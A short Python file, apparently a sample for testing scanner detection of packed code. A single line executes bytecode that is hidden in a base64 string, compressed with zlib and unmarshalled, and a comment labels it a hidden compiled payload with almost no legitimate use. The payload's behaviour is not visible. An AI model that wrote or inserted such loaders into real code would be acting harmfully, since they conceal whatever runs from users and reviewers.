import base64
import marshal
import zlib

# Hidden COMPILED payload: marshalled + zlib + base64 literal on one line (as real
# packers emit it). Near-zero legitimate use; legit code does not ship compiled
# bytecode hidden in a string constant.
exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx7zIAEmKD0Zz4GBoYGhjiGIEZPhhKGIEZlBk2mlyAZP03GW0z5xSsZPoN4kFVwZ2koYWho'))))
